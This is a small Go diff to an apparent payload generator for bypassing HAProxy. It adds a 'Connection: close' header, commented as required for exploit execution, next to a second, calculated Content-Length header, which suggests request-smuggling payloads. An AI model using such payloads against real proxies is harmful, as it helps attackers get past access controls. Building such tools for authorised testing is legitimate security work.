@@ -120,6 +120,11 @@ func (pg *PayloadGenerator) GenerateHAProxyBypassPayloads(targetURL string, bypa
 					Header: "Content-Length",
 					Value:  fmt.Sprintf("%d", calculatedContentLengthForSecondHeader),
 				},
+				// 3. Connection header MUST be close for proper exploit execution
+				{
+					Header: "Connection",
+					Value:  "close",
+				},
 			},
 		}
 
